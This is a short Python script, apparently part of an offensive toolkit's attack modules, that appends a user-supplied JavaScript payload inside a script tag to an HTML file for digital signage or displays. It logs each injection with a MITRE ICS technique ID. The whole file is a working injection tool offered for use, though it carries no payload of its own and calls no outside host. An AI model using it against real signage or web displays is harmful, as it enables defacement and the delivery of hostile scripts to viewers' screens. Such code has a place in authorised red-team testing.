#!/usr/bin/env python3
# modules/attacks/screen_javascript_injector.py

import argparse, json, os, time
from datetime import datetime

LOG_FILE = "results/screen_js_injection_log.json"
MITRE_TTP = "T0801"

def log(js):
    os.makedirs("results", exist_ok=True)
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "js_payload": js,
        "ttp": MITRE_TTP
    }
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f: data = json.load(f)
    else: data = []
    data.append(entry)
    with open(LOG_FILE, "w") as f: json.dump(data, f, indent=2)

def inject(js, target_file):
    try:
        with open(target_file, "a") as f:
            f.write(f"<script>{js}</script>")
        log(js)
        print(f"[✓] Injected JS into {target_file}")
    except Exception as e:
        print(f"[!] Injection failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Inject JS into HTML-based signage or display")
    parser.add_argument("--js", required=True, help="JavaScript payload to inject")
    parser.add_argument("--target", default="webgui/signage.html", help="Target HTML file")
    args = parser.parse_args()
    inject(args.js, args.target)
